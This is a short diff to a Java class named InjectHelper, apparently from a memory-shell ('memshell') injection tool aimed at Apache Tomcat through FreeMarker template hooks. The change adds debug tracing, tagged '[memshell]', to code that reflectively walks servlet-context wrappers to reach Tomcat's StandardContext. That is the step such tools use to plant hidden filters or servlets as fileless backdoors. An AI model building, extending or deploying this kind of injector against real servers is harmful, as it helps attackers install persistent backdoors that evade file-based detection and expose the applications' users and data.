@@ -120,20 +120,26 @@ public class InjectHelper implements TemplateMethodModelEx {
         if (servletContext == null) {
             return null;
         }
+        StringBuilder trace = new StringBuilder();
         if (servletContext.getClass().getName().equals("org.apache.catalina.core.StandardContext")) {
             return servletContext;
         }
         Object o = servletContext;
         for (int i = 0; i < 4; i++) {
+            trace.append('[').append(i).append(']').append(o.getClass().getName());
             Object next = readField(o, "context");
-            if (next == null || next == o) {
+            if (next == null) {
+                trace.append(" context=null(unreadable)");
                 break;
             }
+            trace.append(" context=").append(next.getClass().getName());
             o = next;
             if (o.getClass().getName().equals("org.apache.catalina.core.StandardContext")) {
+                System.out.println("[memshell] context resolved via " + trace);
                 return o;
             }
         }
+        System.err.println("[memshell] cannot resolve StandardContext: " + trace);
         return null;
     }
 
